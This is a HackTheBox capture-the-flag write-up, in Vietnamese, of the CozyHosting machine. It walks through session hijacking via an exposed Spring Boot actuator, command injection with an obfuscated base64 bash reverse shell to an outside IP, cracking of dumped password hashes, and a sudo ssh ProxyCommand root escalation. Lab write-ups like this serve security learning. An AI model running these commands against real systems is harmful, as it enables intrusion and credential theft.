---
title: CozyHosting Writeup - Hackthebox
date: "2024-01-26 14:00:00"
tags: ["OS Command Injection"]
categories:
  - CTF Writeup
  - HackTheBox
---

# CozyHosting

## Enumeration

### Port Scanning

```shell
nmap -sCV -A -p- -T4 -oN port_scans 10.10.11.230
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 22:51 EST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
8090/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
9999/tcp open  abyss?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.24 seconds
```

Lướt qua cổng 80 phát hiện 1 trang login

![CozyHosting](/posts/CozyHosting/Untitled.png)

Cổng 8090 chạy http server python có leak 1 file **cloudhosting-0.0.1.jar,** có thể lấy được source code từ đây.

![CozyHosting](/posts/CozyHosting/Untitled%201.png)

### Directory/File Scanning

Truy cập endpoint không tồn tại thì response trả về 1 trang thông báo lỗi của Spring boot

![CozyHosting](/posts/CozyHosting/Untitled%202.png)

Scan directory với wordlist spring-boot có sẵn trong seclists.

```shell
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -fc 400-599 -recursion
```

```shell
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 400-599
________________________________________________

actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 125ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 125ms]
actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 136ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 119ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 128ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 101ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 90ms]
actuator/sessions       [Status: 200, Size: 145, Words: 1, Lines: 1, Duration: 127ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 145ms]
```

Output của ffuf trả về có vài files khá nguy hiểm, trong đó có file “actuator/sessions” có thể log lại các session ID hiện tại. Đây là lỗi cấu hình của spring boot ([CVE-2023-20866](https://spring.io/security/cve-2023-20866/))

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://cozyhosting.htb/actuator/sessions' -i -X GET
HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 25 Jan 2024 04:43:55 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"1903A4A5CDE14E9C9AE0EBF648EDE3B1":"kanderson"}
```

Có được session của thằng kanderson đem thay session hiện tại của mình. Và:

![CozyHosting](/posts/CozyHosting/Untitled%203.png)

Ngay dưới có chức năng ssh connection, thử chạy ssh server và connect tới máy mình thì nó báo connection timeout. Nhưng:

![CozyHosting](/posts/CozyHosting/Untitled%204.png)

url chuyển hướng lại chứa output của lệnh ssh =)) Khả năng OS Command Injection rất cao.

Có thể câu lệnh SSH nó sẽ trông như thế này:

```bash
ssh <username>@<hostname>
```

Chèn 1 payload command substitution để test:

![CozyHosting](/posts/CozyHosting/Untitled%205.png)

⇒ OS Command Injection

![CozyHosting](/posts/CozyHosting/Untitled%206.png)

Trường username bị filter dấu whitespaces. Có 1 vài tricks để bypass whitespaces ([tại đây](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces))

![CozyHosting](/posts/CozyHosting/Untitled%207.png)

ping thành công, tức câu lệnh của mình đã được thực thi.

Double-base64 payload tạo revershell để bypass một số kí tự đặc biệt.

```bash
┌──(kali㉿kali)-[/home/kali]
└─# echo "echo $(echo 'bash -i >& /dev/tcp/10.10.16.45/9999 0>&1' | base64 | base64)|base64 -d|base64 -d|bash" | sed 's/ /${IFS}/g'
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0ME5TODVPVGs1SURBK0pqRUsK|base64${IFS}-d|base64${IFS}-d|bash
```

![CozyHosting](/posts/CozyHosting/Untitled%208.png)

## Privilege Escalation

Trước tiên, xem trong đây những user nào có shell

```bash
app@cozyhosting:/$ cat /etc/passwd | grep bash
```

![CozyHosting](/posts/CozyHosting/Untitled%209.png)

Flag user nằm trong thư mục home của josh, nhưng với user hiện tại không có quyền đọc. Do vậy, mình phải leo lên josh trước. (Ngoài ra, còn có user _postgres_ ⇒ có thể dbms của hệ thống này chạy PostgreSQL)

![CozyHosting](/posts/CozyHosting/Untitled%2010.png)

### Josh

File jar ban đầu mình tải về còn chưa đụng tới, ta có thể decompile source code ban đầu bằng tools [JD-GUI](https://java-decompiler.github.io/).

Như đã đề cập ở trước, trong hệ thống tồn tại user _postgres_. Thử check PostgreSQL có đang hoạt động không (PostgreSQL mặc định chạy ở cổng 5432)

![CozyHosting](/posts/CozyHosting/Untitled%2011.png)

Vậy đã sure rằng PostgreSQL hoạt động. Tiếp theo, hỏi chatgpt xem file config của thằng PostgreSQL nó nằm ở đâu trong source code:

![CozyHosting](/posts/CozyHosting/Untitled%2012.png)

Nó nằm ở file **application.properties** hoặc **application.yml**

![CozyHosting](/posts/CozyHosting/Untitled%2013.png)

Đây rồi, tiến hành login

```bash
psql -h localhost -d cozyhosting -U postgres -p 5432 -W
```

![CozyHosting](/posts/CozyHosting/Untitled%2014.png)

Tables

```bash
Schema |     Name     |   Type   |  Owner   | Persistence | Access method |    Size    | Description
--------+--------------+----------+----------+-------------+---------------+------------+-------------
 public | hosts        | table    | postgres | permanent   | heap          | 8192 bytes |
 public | hosts_id_seq | sequence | postgres | permanent   |               | 8192 bytes |
 public | users        | table    | postgres | permanent   | heap          | 8192 bytes |
(3 rows)
```

Bảng users có vẻ thú vị đấy

```bash
Table "public.users"
  Column  |          Type          | Collation | Nullable | Default
----------+------------------------+-----------+----------+---------
 name     | character varying(50)  |           | not null |
 password | character varying(100) |           | not null |
 role     | role                   |           |          |
```

Dump bảng users

```bash
	 name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

Để giải quyết đống hash này, tui sẽ dùng John-The-Ripper

```bash
┌──(root㉿kali)-[/home/kali]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (admin)
1g 0:00:00:18 DONE (2024-01-25 04:43) 0.05305g/s 148.9p/s 148.9c/s 148.9C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Liệu josh với admin có phải là một?

![CozyHosting](/posts/CozyHosting/Untitled%2015.png)

Josh pwned!

### Root

![CozyHosting](/posts/CozyHosting/Untitled%2016.png)

Payload từ GTFobins: [https://gtfobins.github.io/gtfobins/ssh/](https://gtfobins.github.io/gtfobins/ssh/)

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![CozyHosting](/posts/CozyHosting/Untitled%2017.png)
